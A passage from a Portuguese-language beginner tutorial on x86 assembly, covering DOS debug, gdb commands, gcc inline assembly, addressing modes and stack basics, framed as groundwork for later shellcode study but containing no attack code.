0D3C:0100 MOV AX,F
0D3C:0103 SUB AX,1
0D3C:0106
-t

AX=000F  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0103   NV UP EI PL NZ NA PO NC
0D3C:0103 2D0100        SUB     AX,0001
-t

AX=000E  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0106   NV UP EI PL NZ NA PO NC
0D3C:0106 07            POP     ES
-q


Repare que o registrador AX depois da  subtracao de 1, equivale a E. Lembre-se que
registradores trabalham com a base hexadecimal[2], portanto  um conhecimento sobre 
a mesma e mais que necessario.
 

--=[ JMP ]=--


Essa instrucao salta (JuMP) para um determinado endereco de memoria, fazendo com que 
o fluxo do programa seja desviado para esse endereco. 


C:\Documents and Settings\David&gt;debug
-a
0D3C:0100 MOV DL,1         ;  Move 1 para DL
0D3C:0102 INC DL           ;  Incrementa DL em 1
0D3C:0104 JMP 0100         ;  Salta para o endereco inicial
0D3C:0106

Nesse exemplo acima, todas as vezes que o fluxo de dados chegar ao endereco 
0104, ele saltara para o endereco inicial que continuara a executar as ins-
trucoes anteriores ao salto, ou seja, &#039;DL&#039; nao pararia de ser incrementado, 
mas devido a rotina, ele nao passaria do valor 2, pois a primeira instrucao 
sobrescreve o valor anterior.


=================
Intrucoes logicas
=================


Na linguagem binaria 1 e 0 significam verdadeiro e falso respectivamente. As instrucoes
descritas a seguir comparam dois valores e retornam  um valor  verdadeiro ou falso, e o 
registrador de destino (sintaxe INTEL) que recebera os dados retornados. 


--=[ AND ]=--


Essa intrucao compara dois valores e retorna um valor verdadeiro se as duas instrucoes 
tambem forem verdadeiras. 

AND 1 1 = 1
AND 0 1 = 0
AND 1 0 = 0
AND 0 0 = 0


--=[ OR ]=--


A instrucao OR (ou) por sua vez requer que apenas um dos valores seja verdadeiros, 
para tambem retornar um valor positivo. Veja:

OR 1 1 = 1
OR 1 0 = 1
OR 0 1 = 1
OR 0 0 = 0


--=[ XOR ]=--


Essa instrucao e quase igual ao OR, ela faz a comparacao de dois valores e apenas 
retorna um valor verdadeiro quando um deles (&quot;apenas um&quot;) for tambem  verdadeiro. 
Repito: Apenas um dos dois valores comparados deve ser &#039;1 &#039;(verdadeiro) para essa 
instrucao retornar um valor verdadeiro.


C:\Documents and Settings\David&gt;debug
-A
0D3C:0100 MOV AX,1     ; Move 1 para AX
0D3C:0103 XOR AX,1     ; 1, 1 = 0
0D3C:0106
-t

AX=0001  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0103   NV UP EI PL NZ NA PO NC
0D3C:0103 350100        XOR     AX,0001

Repare que o valor 1 foi copiado para AX, abaixo segue a instrucao que compara
os valores referentes.

-t

AX=0000  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0106   NV UP EI PL ZR NA PE NC
0D3C:0106 07            POP     ES
-q

C:\DOCUME~1\David&gt;


Veja que o resultado foi falso, porque &quot;apenas um&quot; dos registradores tem que armazenar
o valor 1 e nesse caso os dois valores envolvidos no teste eram 1, assim sobrescreven-
do o valor que tinha sido previamente armazenado em AX (&#039;1&#039;), com o  valor &quot;retornado&quot; 
pela operacao XOR (0). 

XOR 1 1 = 0
XOR 1 0 = 1
XOR 0 1 = 1
XOR 0 0 = 0



----- Capitulo 0x05


[=] + =========================================== + [=]
          ---=[  GNU debugger - gdb ]=--- 
[=] + =========================================== + [=]


O GDB e um debugger nativo dos *nixes/Linuxes, mas foi portado para arquitetura w32.
Como o proprio nome ja dos diz, um  debugger nada mais e do  que o  programa que nos 
mostrara os codigos internos de   outro  programa (por exemplo) em  assembly. Recur-
so esse que e muito util para  sabermos o que o programa faz no nosso sistema quando
seu codigo fonte nao e divulgado e para o descobrimento de bugs em nossos programas.
Com um  debugger podemos  ver  os &quot;enderecos&quot; de memoria utilizados pelos programas, 
suas bibliotecas, e tambem podemos modificar suas instrucoes  internas. Se escrever-
mos um programa usando a linguagem assembly, as instrucoes deste  mesmo programa se-
rao vistas em  assembly no debugger, ou seja, na linguagem  que escrevemos. Veja al-
gumas opcoes que nos serao muito uteis  para o completo  entendimento da  stack e um 
&quot;entendimento&quot; maior sobre o desenvolvimento de shellcodes tanto para windows quanto 
para *nixes/Linuxes. 



-q             --&gt;  Esta opcao (Quiet) na chamada do programa nao emite banner do gdb.

break          --&gt;  Esta opcao seta um breakpoint, que nada mais e do que definir onde 
                    o programa sera &quot;pausado&quot; quando iniciarmos o mesmo (&quot;run&quot;).  Cada 
                    break point recebe um numero de identificacao.

disassemble    --&gt;  Esta e a opcao que nos mostra o codigo em assembly propriamente di-
                    to, ou seja, seguido de um frame, ela e capaz de nos  mostrar todas
                    as instrucoes daquele frame.

run           --&gt;  Esta opcao que sera utilizada para iniciar a execucao  do programa
                   dentro do debugger. Esta opcao pode ou  nao receber argumentos.

list          --&gt;  Nos mostra os symbols armazenados na tabela de exportacao de symbols 
                   de um programa. 

info          --&gt;  Usado para visualizarmos determinadas informacoes. Dentre elas po-
                   podemos ressaltar: 

                   register (registrador) -&gt; Exibe valores de registradores.
                   breakpoints            -&gt; Exibe os breakpoints setados. 
                    
                   Para maiores informacoes  digite o comando  &#039;info&#039; no gdb, que lhe  
                   sera mostrado varias opcoes.

del           --&gt;  Remove um breakpoint especificado por um numero. Se este numero for
                   omitido, todos os breakpoints serao deletados.

file          --&gt;  Carrega a tabela de symbols de um determinado programa. 

continue      --&gt;  Continua a execucao do programa depois de uma parada (breakpoint).  

x/            --&gt;  Com esta opcao definimos alguns metodos uteis de visualizacao de 
                   dados do programa. Tais como:

                   s   --&gt;  Exibe a string (&quot;texto&quot;) armazenada em um endereco.
                   x   --&gt;  Exibe os dados em hexadecimal. 
                   i   --&gt;  Exibe a instrucao em  assembly contida no endereco. 
                   b   --&gt;  Um unico byte (opcode). 


----- Capitulo 0x06


[=] + =========================================== + [=]
            -----=[  gcc in-line ]=----- 
[=] + =========================================== + [=]


Com o gcc existe a possibilidade de insercao de instrucoes em assembly em codigos &#039;C&#039;,
utilizando o recurso __asm ();, essa instrucao determina a inicializacao de instrucoes 
assembly. Com a  utilizacao do gcc &quot;in-line&quot;  podemos  criar  rotinas para execucao de     
shellcodes (citado adiante) utilizando assembly, entre varias outras  boas utilidades. 
Este capitulo sera destinado a lhe dar uma melhor &quot;firmacao&quot; dos conhecimento descrito 
neste paper. As sintaxes utilizadas abaixo serao detalhadamente  descritas no decorrer 
deste documento, portanto encare este capitulo apenas  como uma  &quot;previa apresentacao&quot; 
do que foi e do que lhe  sera ensinado, pois a intencao deste  texto e firmar o conhe-
cimento em hacking na sua mente, nao dar exemplos vagos. Veja  alguns exemplos de sin-
taxes do gcc in-line:


Exemplo I


 main (){                           
                                                                 
  __asm (&quot; NOP;NOP;NOP \n&quot;);          
                                                              
 }                                    
     
                                       
Exemplo II 

    
 main (){                 
       
  __asm (                   
      
  &quot;NOP \n&quot;                
  &quot;NOP   &quot;); 
}            


======================
Entendendo os Symbols
======================


Resumidamente, o recurso  de symbols nada mais  e do que um  recurso  que salva em tempo 
de compilacao, em uma tabela, as instrucoes nativas (Codigo fonte) de um programa, nesse 
caso, escrito em C. Quando  um programa e compilado voce pode decidir se deseja exportar 
symbols (Simbolos), ou nao. No processo de compilacao[5] de um programa, os codigos  sao 
pre-processados e convertidos em assembly, depois  seguem para mais processos, assim fa-
zendo com que todas as linhas de codigo nativas, como variaveis e  rotinas, que estao no 
formato escrito por voce, sejam  perdidas. Assim seria impossivel de debuga-lo  usando o 
gdb. Para compilar um programa com suporte a depuracao, basta usar a opcao -g do gcc.


-- testing.c -- 

#include &lt;stdio.h&gt;

main (){
     
 puts (&quot;This is a test&quot;);
     
}

-- cut here -- 



C:\&gt;gcc testing.c -o test -g

C:\&gt;gdb test -q
(gdb) list
1       #include &lt;stdio.h&gt;
2
3       main (){
4
5        puts (&quot;This is a test&quot;);
6
7       }
(gdb) q


Se nao compilarmos habilitando o suporte a debugging ao executavel, o resultado sera
este apresentado abaixo.


C:\&gt;gcc testing.c -o test

C:\&gt;gdb test -q
(no debugging symbols found)...(gdb)
(gdb) q

C:\&gt;


Um detalhe segue: Quando voce compila um programa utilizando o Dev-C++ o gcc usa a 
opcao -g por padrao (Underground blood).


====================================
Movimentacao de dados em gcc in-line
====================================


-- inline.c --

main (){

__asm (

&quot;MOV  $0xA, %ebx \n&quot; 
&quot;MOVL %ebx, %eax \n&quot; );

}

-- cut here -- 


Agora vamos &quot;disassemblar&quot; esse programa para vermos o estado do registrador eax. 
Primeiramente inicializo o gdb sem a emissao do banner do programa (-q) para logo
depois visualizar os symbols do programa a ser debugado, ou seja, o seu codigo. 



C:\Documents and Settings\David\Desktop&gt;gdb inline.exe -q
(gdb) list
1       main (){
2
3       __asm (
4
5       &quot;MOV  $0xA, %ebx \n&quot;
6       &quot;MOVL %ebx, %eax \n&quot; );
7
8       }
9

Vamos agora usar o comando disassemble (abreviado para disass) seguido  da parte do
codigo que desejamos visualizar as instrucoes, ou seja, a parte do codigo que quero 
ver &quot;disassemblada&quot;. Repare que  utilizo um &quot;symbol&quot; para referencia-la. Nesse caso 
desejo ver as instrucoes a partir do entry point (ponto de  entrada), main. O Entry 
point e o nome que se da ao local onde se iniciam os codigos. 


(gdb) disass main
Dump of assembler code for function main:
0x401290 &lt;main&gt;:        push   %ebp
0x401291 &lt;main+1&gt;:      mov    %esp,%ebp
0x401293 &lt;main+3&gt;:      sub    $0x8,%esp
0x401296 &lt;main+6&gt;:      and    $0xfffffff0,%esp
0x401299 &lt;main+9&gt;:      mov    $0x0,%eax
0x40129e &lt;main+14&gt;:     add    $0xf,%eax
0x4012a1 &lt;main+17&gt;:     add    $0xf,%eax
0x4012a4 &lt;main+20&gt;:     shr    $0x4,%eax
0x4012a7 &lt;main+23&gt;:     shl    $0x4,%eax
0x4012aa &lt;main+26&gt;:     mov    %eax,0xfffffffc(%ebp)
0x4012ad &lt;main+29&gt;:     mov    0xfffffffc(%ebp),%eax
0x4012b0 &lt;main+32&gt;:     call   0x401710 &lt;_alloca&gt;
0x4012b5 &lt;main+37&gt;:     call   0x4013b0 &lt;__main&gt;
0x4012ba &lt;main+42&gt;:     mov    $0xa,%ebx
0x4012bf &lt;main+47&gt;:     mov    %ebx,%eax
0x4012c1 &lt;main+49&gt;:     leave
0x4012c2 &lt;main+50&gt;:     ret
End of assembler dump.


Eu poderia disassemblar qualquer symbol. Repare tambem que e  &quot;possivel&quot; abreviar as 
intrucoes do gdb, info poderia ser apenas &#039;i&#039;, register poderia ser apenas &#039;r&#039; e run 
poderia ser tambem apenas &#039;r&#039;. Veja que as instrucoes escritas por nos se iniciam no
endereco de memoria da instrucao &#039;main+42&#039;, ou seja, a partir do endereco 0x4012ba .  
E nessa instrucao (&#039;42&#039;) de main que ha uma copia do valor em hexadecimal &#039;A&#039; para o 
registrador ebx. O intuito aqui e visualizar o valor armazenado no  registrador eax, 
e aprender mais sobre o gdb, portanto marcaremos um  breakpoint na instrucao main+49 
que e a instrucao seguinte a  operacao de copia, assim  poderemos ver o resultado da 
operacao anterior.


(gdb) break *main+49
Breakpoint 1 at 0x4012c1: file C:/Documents and Settings/David/Desktop/inline.c, line 8.


Marcamos o ponto de parada do programa apos sua execucao (comando run) dentro do de-
bugger. Vamos ver informacoes sobre esse ponto de parada.


(gdb) i breakpoints
Num Type           Disp Enb Address    What
1   breakpoint     keep y   0x004012c1 in main
                                       at C:/Documents and Settings/David/Desktop/inline.c:8
        breakpoint already hit 1 time


Acima podemos ver em que funcao o breakpoint esta setado, o endereco de memoria que esse 
breakpoint esta setado, o numero de identificacao  deste  breakpoint  caso nos quisermos 
remove-lo (del 1), entre outras informacoes. Vamos iniciar a execucao do programa.


(gdb) r
Starting program: C:\Documents and Settings\David\Desktop/inline.exe

Breakpoint 1, main () at C:/Documents and Settings/David/Desktop/inline.c:8
8       }


O programa parou no breakpoint, vamos ver agora o valor de &#039;eax&#039; e do registrador que
aponta para a proxima instrucao a ser executada, o extended instruction pointer (eip).


(gdb) i r eax eip
eax            0xa      10        
eip            0x4012c1 0x4012c1


Veja que nos e mostrado em hexadecimal (0xa) e em decimal (10) o valor contido no re-
gistrador eax. Veja que o eip esta apontando para o endereco  0x4012c1, vamos ver que 
instrucao sera executada quando eu continuar a execucao do programa dentro do gdb.


(gdb) x/i $eip
0x4012c1 &lt;main+49&gt;:     leave


Veja que utilizo o cifrao (&#039;$&#039;)  para referenciar o registrador. Tambem veja que u-
tilizo o parametro &#039;i&#039; (instrucion) do x/ para visualizar  a instrucao  em assembly  
armazenada no endereco que o registrador eip  aponta. Continuaremos  a  execucao do 
programa apos a parada e sairemos do gdb.


(gdb) continue
Continuing.

Program exited with code 012.
(gdb) quit



----- Capitulo 0x07


[=] + =========================================== + [=]
      -----=[  Modos de enderecamento ]=----- 
[=] + =========================================== + [=]


Os modos de enderecamento sao os que vao determinar como os dados serao enderecados 
pelo processador. Cada  instrucao em assembly e convertida no que costumamos chamar 
de opcode (Operation code - Codigo de operacao), que e a intrucao que o processador 
&quot;realmente executa&quot;, instrucoes em  assembly  nada mais sao  do que &quot;representacoes 
legiveis&quot; a essas  intrucoes. Quando  compilamos  a instrucao  &#039;NOP&#039; por exemplo, o 
processador converte esta &quot;representacao&quot; no  seu  respectivo opcode. O  opcode que 
representa essa instrucao e o &#039;90&#039;, e esta instrucao em  hexadecimal (opcode) que o 
processador realmente executa. Os  instructions set sao  convertidos em  instrucoes  
hexadecimais, pelo processador, que fara um enderecamento de  acordo com as instru-
coes em assembly utilizadas. Basicamente existe &#039;6&#039; tipos de modos de enderecamento, 
que sao:


1 - Register Addressing     [Enderecamento registrador      ]
2 - Immediate Addressing    [Enderecamento imediato         ]
3 - Direct Addressing       [Enderecamento direto           ]
4 - Indirect Addressing     [Enderecamento indireto         ]
5 - Basepointer Addressing  [Enderecamento de ponteiro base ]
6 - Indexed Addressing      [Enderecamento indexado         ] 


*********************************
*Register Addressing Mode - RAM *     
*********************************


O modo de enderecamento registrador e composto basicamente por  uma copia de dados
de um registrador para o outro, veja um exemplo:


-- example.c -- 
                             
/*
*
*  ---=[ Sintaxe AT&amp;T]=--- 
* 
*   source -&gt; destination
*
*/

main (){

__asm (

&quot;MOVL %ebx, %eax \n&quot; );

}

-- cut here --
 
Nesse exemplo, os 32 bits ([long] 4 bytes) de dados que o registrador ebx armazena 
sao  copiados para o registrador eax. Na sintaxe AT&amp;T[4] utilizamos a notacao per-
centual (&#039;%&#039;) para referenciarmos os registradores.


**********************************
*Immediate Addressing mode - IAM *
**********************************


Com o modo de enderecamento imediato nos nao &quot;referenciamos&quot; valores, mas sim de-
claramos valores imediatos em si. Nos podemos declarar valores imediatos em hexa-
decimal, ou em decimal. Como em C e assembly para referenciarmos  valores hexade-
cimais precisamos utilizar a notacao 0x seguida do valor  propriamente dito, esse 
valor por sua vez pode ser endereco de memoria ou apenas um numero qualquer. Veja
um exemplo do modo de enderecamento imediato:


main (){

__asm (

&quot;MOVL $0x0A, %eax \n&quot; );

}


Repare que o valor hexadecimal 0A (10 em decimal) foi denotado com o cifrao &#039;$&#039; 
que e  utilizado para referenciar o valor imediato que sera  copiado para o re-
gistrador eax. Para passarmos valores decimais obviamente que  bastaria que nao 
utilizemos a notacao de valores hexadecimais (&#039;0x&#039;). Exemplo: $10 . Mas  como o 
processador trabalha com numeros hexadecimais voce vera o 0x&#039;a&#039; ao invez de dez
quando disassemblar.

(...)

0x4012be &lt;main+46&gt;:     mov    $0xa,%eax

(...)


*******************************
*Direct Addressing Mode - DAM * 
*******************************


O modo de enderecamento direto e o padrao, com este metodo referenciamos enderecos 
de memoria. Todos os valores passados sao em  hexadecimal, pois e a  base numerica 
usada nesse nivel de programacao.

Exemplo I


-- dam.c -- 

main (){

__asm (

&quot;MOVL 0x00000010, %eax \n&quot; );

}

-- cut -- 


Repare que para referenciar enderecos de memoria nao utilizamos o cifrao, pois
estamos trabalhando no nivel de processador (hexadecimal).


Exemplo II


-- dam_sampleII.c -- 

main (){
    
   char buffer1[4], buffer2[]=&quot;fox&quot;;
   
   strcpy (buffer1, buffer2);
   
 __asm (
  
  &quot;NOP; NOP; NOP; NOP    \n&quot;
  &quot;MOV  0x00000010, %eax   &quot;
);
    
}

-- cut -- 


C:\Documents and Settings\David\Desktop&gt;gdb dam_sampleII.exe -q
(gdb) disass main
Dump of assembler code for function main:

(...)

0x4012ba &lt;main+42&gt;:     mov    0x403000,%eax            &lt;---------- DAM
0x4012bf &lt;main+47&gt;:     mov    %eax,0xfffffff8(%ebp)
0x4012c2 &lt;main+50&gt;:     lea    0xfffffff8(%ebp),%eax

(...)
     
0x4012d4 &lt;main+68&gt;:     nop
0x4012d5 &lt;main+69&gt;:     nop
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
0x4012d6 &lt;main+70&gt;:     nop
0x4012d7 &lt;main+71&gt;:     nop
0x4012d8 &lt;main+72&gt;:     mov    0x10,%eax                &lt;---------- 
0x4012dd &lt;main+77&gt;:     leave


O que caracteriza esse modo de enderecamente e a nao utilizacao de nenhum sinal 
especial, como referencias a ebp. Ele basicamente pega um endereco de memoria e
copia para um registrador. Vale ressaltar que voce nao pode copiar  um endereco 
de memoria para outro endereco diretamente.
 

=================
Um detalhe segue 
=================


Setaremos um breakpoint na instrucao seguinte a que copia o endereco de memoria que
contem a string &quot;fox&quot; para o registrador eax, ou seja, a instrucao 47 de main.  


0x4012ba &lt;main+42&gt;:     mov    0x403000,%eax

A string esta armazenada no endereco de memoria 0x&#039;403000&#039;. Setaremos o breakpoint na 
proxima instrucao:


(gdb) break *main+47
Breakpoint 1 at 0x4012bf: file C:/Documents and Settings/David/Desktop/dam_sampleII.c, line 3.


Executo o programa:


(gdb) r
Starting program: C:\Documents and Settings\David\Desktop/dam_sampleII.exe

Breakpoint 1, 0x004012bf in main ()
    at C:/Documents and Settings/David/Desktop/dam_sampleII.c:3
3          char buffer1[4], buffer2[]=&quot;fox&quot;;


O programa parou, agora veremos se a string realmente esta contida no endereco de 
memoria 0x&#039;403000&#039;:


(gdb) x/s 0x403000
0x403000 &lt;_data_end__+4032&gt;:     &quot;fox&quot;


Esta. Bem, voce viu que na instrucao anterior a parada, os dados sao copiados para o 
registrador eax, mas nos nao podemos fazer a leitura desses dados (&quot;Enderecados pelo  
modo de enderecamento direto&quot;) quando os mesmos estao no registrador eax &quot;logo apos&quot;
a copia dos dados usando o modo de enderecamento direto.


(gdb) i r eax
eax            0x786f66 7892838
(gdb) x/s 0x786f66
0x786f66:        &lt;Address 0x786f66 out of bounds&gt;

 
Para lermos o valor que esta armazenado no endereco de memoria que eax guarda, devemos 
primeiramente fazer o sistema copiar os dados armazenados no registrador &#039;eax&#039;, para a 
stack, depois que o mesmo estiver &quot;apontando&quot; para esses dados &quot;na stack&quot;, e que pode-
mos fazer a leitura do endereco de memoria apontado/guardado &quot;no eax&quot;.



0x4012bf &lt;main+47&gt;: mov %eax,0xfffffff8(%ebp)   &lt;-- Move o valor de eax para a stack
0x4012c2 &lt;main+50&gt;: lea 0xfffffff8(%ebp),%eax   &lt;-- Faz eax armazenar o  endereco da 
                                                    string, na stack. 


Variaveis locais sao alocadas na stack, no caso temos duas variaveis locais neste 
programa acima, que sao:


   char buffer1[4], buffer2[]=&quot;fox&quot;;


Veja que ebp  referencia a stack, este modo de enderecamento sera citado adiante.
Repare que na instrucao 47 os dados (str) foram copiados para a stack (leia sobre
a mesma no capitulo abaixo) e na instrucao 50  eax aponta (armazena) o &quot;endereco&quot;
da stack no qual  esta contida nossa string. Agora se  setarmos  um breakpoint na  
proxima instrucao, podemos visualizar os dados armazenados no endereco de memoria
que eax guarda, que e o endereco da string na  stack. Vamos testar. Primeiramente
setaremos um ponto de parada na instrucao 53 de main e iniciamos o programa.


(gdb) break *main+53
Breakpoint 1 at 0x4012c5: file C:/Documents and Settings/David/Desktop/dam_sampleII.c, line 5.
(gdb) r
Starting program: C:\Documents and Settings\David\Desktop/dam_sampleII.exe

Breakpoint 1, 0x004012c5 in main ()
    at C:/Documents and Settings/David/Desktop/dam_sampleII.c:5
5          strcpy (buffer1, buffer2);


Agora que o programa parou veremos o endereco que eax armazena:

(gdb) i r eax
eax            0x22ff70 2293616


O endereco 0x22ff70 e um endereco referente a uma parte da stack/pilha. Veremos 
agora se esse endereco e o da string.


(gdb) x/s 0x22ff70
0x22ff70:        &quot;fox&quot;


Perfeito. Isso foi apenas uma base para voce entender melhor o proximo capitulo.
No qual falo sobre o funcionamento da stack (O que e e  como funciona). Nos tam-
bem podemos ler determinados bytes da string na stack. Para isso basta nao espe-
cificarmos o endereco inicial de uma string armazenada na memoria (Final &#039;0&#039;). A 
string fox\0 possui 3 caracteres e o NULL byte, 4 caracteres, entao se eu quiser
visualizar a letra &#039;x&#039; utilizo a seguinte sintaxe:


(gdb) x/s 0x22ff72
0x22ff72:        &quot;x&quot;      

Tendo em vista que:

0x22ff70 -&gt; f
0x22ff71 -&gt; 0
0x22ff72 -&gt; x
0x22ff73 -&gt; \0

Se especificarmos um endereco, o gdb nos mostrara tudo que existe deste ponto,
para frente.

(gdb) x/s 0x22ff71
0x22ff71:        &quot;ox&quot;

Claro que os dados devem ser pertencentes ao mesmo bloco. Bloco esse que eh 
iniciado com 0 e terminada no NULL byte (O terminador de string - &#039;\0&#039;). 


**********************************
* Indirect Addressing Mode - IAM *
**********************************


Este sem duvida e o modo de enderecamente mais facil de ser entendido. Ele consiste
em representarmos um endereco de memoria atraves de um registrador entre parenteses
na origiem da sintaxe utilizada, assim  copiando tal endereco para o registrador de 
destino. Veja um melhor exemplo deste modo:

-- cut -- 

main (){

__asm (

&quot;MOVL 0x00000005, %eax \n&quot; 
&quot;MOVL (%eax),%ebx      \n&quot; ); 

}

-- cut --
 

[1] - 0x4012ba &lt;main+42&gt;:     mov    0x5,%eax         &lt;--- Direct Addressing Mode
[2] - 0x4012bf &lt;main+47&gt;:     mov    (%eax),%ebx      &lt;--- Indirect Addressing Mode


1 - Modo de enderecamento direto utilizado para a copia do endereco 0x00000005 para 
    o registrador eax.

2 - Modo de enderecamento indireto. O endereco anteriormente copiado para o regis-
    trador eax agora sera copiado para o registrador ebx. Veja que  eax esta entre
    parenteses, isso faz uma copia DO VALOR ARMAZENADO NELE (0x00000005) para ebx.


*************************************
* Basepointer Addressing Mode - BAM *
*************************************


O modo de  enderecamento de ponteiro  base utiliza um  endereco base armazenado em um 
registrador (ebx - Extended base, registrador base nesse caso) e um offset  para cal-
cular um endereco real. Antes dos dados serem movidos o deslocamento (offset) e inse-
rido ao  endereco base e o resultado  final e  retornado  para o  destino  da sintaxe  
utilizada, assim ao termino desta operacao o  endereco  direto para o valor requerido 
e entao encontrado. Esse modo de enderecamento e semelhante ao IAM, pois tambem e uti-
lizado o valor de um registrador entre parenteses (Endereco Base) para passar  um va-
lor indiretamente. A unica diferenca deste metodo para o outro e a ja falada insercao 
de um  offset e o metodo que este deve ser especificado, ou seja, o  mesmo devera fi-
car antes do registrador  que armazena o endereco base. 


Exemplo:


-- BPAM.c -- 

main (){

__asm (

&quot;MOVL 0x00000005, %ebx \n&quot; 
&quot;MOVL 4(%ebx),%eax     \n&quot; ); 

}

-- cut --

 
[1] - 0x4012ba &lt;main+42&gt;:     mov    0x5,%ebx
[2] - 0x4012c0 &lt;main+48&gt;:     mov    0x4(%ebx),%eax


1 - Move o endereco 0x00000005 para ebx.

2 - O offset (0x04) e adicionado ao endereco base (0x00000005)  armazenado em ebx
    e assim formando o valor 0x00000009 e movendo-o para o registrador eax. Entao 
    o endereco real/absoluto e 0x00000009.    


***********************************
* Indexed Addressing Mode - IDAM  *
***********************************


Utilizando  esse metodo para se encontrar o  endereco absoluto sao utilizados tres 
valores, que sao: Um &#039;endereco de memoria&#039;, um &#039;registrador&#039; e um &#039;multiplicador&#039;. 
O valor armazenado no index register e multiplicado por um numero, depois esse re-
sultado e adicionado ao endereco de memoria e logo em seguida este  valor e final-
mente retornado. Um exemplo:


-- IDAM.c -- 

main (){

 __asm (

 &quot;MOV $3, %ebx                  \n&quot;
 &quot;MOV 0x000008 (,%ebx,2), %eax  \n&quot;);

}

-- cut -- 


[1] - 0x4012ba &lt;main+42&gt;:     mov    $0x3,%ebx
[2] - 0x4012bf &lt;main+47&gt;:     mov    0x8(,%ebx,2),%eax


1 - E copiado o valor 0x03 para o registrador ebx .

2 - O valor do index register ebx (0x&#039;00000003&#039;) e multiplicado por &#039;2&#039;, nesse caso, ou 
    seja, 0x00000003 * 2, e logo em seguida o resultado (0x00000006) e  &quot;adicionado&quot; ao 
    endereco de memoria (0x00000008). O resultado final  desta  operacao e: 0x0000000E. 
    0x0E em hexadecimal corresponde a 14 em decimal, 14 e o resultado de 8 + 6.  


Um detalhe que nao podemos esquecer e que, o resultado da multiplicacao do index register 
por um numero deve retornar sempre um numero hexadecimal. Exemplo:


  MOV 0x05, %ebx                        &lt;--- 0x05 e copiado para ebx
  MOV 0x00000000 (,%ebx, 4), %eax       &lt;--- Leia abaixo

  
O detalhe vem agora, veja que o resultado de cinco vezes  quatro e igual a 20 EM DECIMAL,
mas com esse modo de enderecamento e com  todos os  outros, nao podemos  retornar valores 
decimais por que estavamos no nivel de programacao do micro-processador, ou seja, estamos 
mechendo com a memoria do sistema, portanto devemos utilizar numero hexadecimais para tudo 
&quot;neste nivel&quot;. Entao o resultado que sera MOVido para o registrador  acumulador (eax) e o
0x00000014 (Tendo em vista que o endereco base e 0x00000000), pois 0x14  equivale a 20 em 
decimal, resultado esse de 5 vezes 4. Voce vera logo mais que apenas dois valores sao re-
almente necessarios neste modo de enderecamento. Exemplo:

movl $0x0,(%esp,1)


----- Capitulo 0x07


[=] + =========================================== + [=]
      ---=[  Funcionamento basico da stack  ]=--- 
[=] + =========================================== + [=]



A stack, ou &quot;pilha&quot; (em portugues) e utilizada para varias coisas na execucao de
um programa, como por exemplo: Armazenar endereco de retorno (Falarei adiante) e 
passar parametros para as subrotinas. Todas as  variaveis locais sao armazenadas  
na &#039;stack&#039;. As instrucoes utilizadas para manipulacao da stack sao: 


PUSH            ---&gt;  EMPURRA DADOS SOBRE A PILHA. Nao se esqueca de que o re-
                      gistrador que  aponta para o topo da pilha/stack e o esp 
                      (extended stack pointer).

POP             ---&gt;  &quot;RETIRA&quot; ESSES  DADOS DO TOPO DO  STACK E  INSERE OS MESMOS 
                      SOBRE ALGUM REGISTRADOR  ESPECIFICADO POR NOS. Esses  dados 
                      nao sao literalmente retirados, pois a pilha e marcada como
                      somente leitura. O que acontece e que o registrador esp nao 
                      aponta mais para esse endereco &quot;retirado&quot; da stack.


==================================
Exemplos das instrucoes push e pop
==================================


C:\Documents and Settings\David&gt;debug
-A
0D3C:0100 MOV CH,10  ; Depois da instrucao: CX = 1000
0D3C:0102 PUSH CX    ; Empura o valor &#039;1000&#039; para o topo da stack/pilha.
0D3C:0103 POP DX     ; &quot;Retira&quot; esses dados da stack e copia para o register DX.
0D3C:0104 POP AX     ; A stack nao armazena  mais 1000, portanto nao copia 1000.


-t  &lt;-- Executa a primeira instrucao, a que esta no endereco 0100.
                      
=======  =======  CX=1000  DX=0000  =======  =======  =======  =======
=======  =======  =======  =======  IP=0102   NV UP EI PL NZ NA PO NC
0D3C:0102 51            PUSH    CX

-t  &lt;-- Executa a instrucao que joga o valor de CX para o topo do stack

=======  =======  CX=1000  DX=0000  =======  =======  =======  =======
=======  =======  =======  =======  IP=0103   NV UP EI PL NZ NA PO NC
0D3C:0103 5A            POP     DX

-t  &lt;-- Executa a instrucao que &quot;retira&quot; esses dados da stack e copia para DX

AX=0000  =======  CX=1000  DX=1000  =======  =======  =======  =======
=======  =======  =======  =======  IP=0104   NV UP EI PL NZ NA PO NC
0D3C:0104 58            POP     AX
-q


Nao executei a ultima instrucao, mas o  resultado e &quot;0000&quot; nesse caso, pois depois
do primeiro POP, a stack nao guarda mais o valor 1000, portanto  AX continuaria 0.
A stack funciona no esquema que costumamos chamar de LIFO - Last in First Out, que
significa: O ultimo dentro,  primeiro fora.  A stack/pilha recebe esse nome justa-
mente por trabalhar dessa maneira. Imagine uma  pilha  de CD&#039;s (chega de prato ;),
voce empilha  seus CD&#039;s um sobre o outro, o ultimo &#039;CD&#039; que voce coloca no topo da 
pilha e o primeiro que voce retira. E assim que funciona a stack, o ultimo parame-
tro empurrado no topo do stack, e o primeiro parametro que a syscall pegara. Todas 
as vezes que uma funcao/syscall e chamada  essa  mesma  syscall pega os parametros 
passados  para seus  argumentos, da pilha, ou  seja, esses  dados sao  previamente 
empilhados em tempo de execucao sobre o stack, e pegos na execucao da syscall.

Vejam esse codigo fonte:


-- msg.c -- 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

main (){
     
   MessageBoxA (0, &quot;Text&quot;, &quot;Title&quot;, 64);
   exit (0);     
} 

-- cut --


A funcao MessageBoxA exibe uma mensagem em uma caixa de dialogo. Seus parametros 
correspondem a: Dono da janela (0), texto da mensagem (&quot;Text&quot;), titutlo (&quot;Title&quot;)
da janela e estilo de mensagem (64 = OK). Em tempo de execucao este programa em-
pilhara os respectivos argumentos desta funcao e chamara (&quot;call&quot;) o  endereco de  
memoria onde esta armazenado a funcao MessageBoxA. Apos essa chamada a funcao, o  
ultimo dado empilhado, sera  o primeiro retirado. Veja esse exemplo para uma me-
lhor compreensao:


int MessageBox (

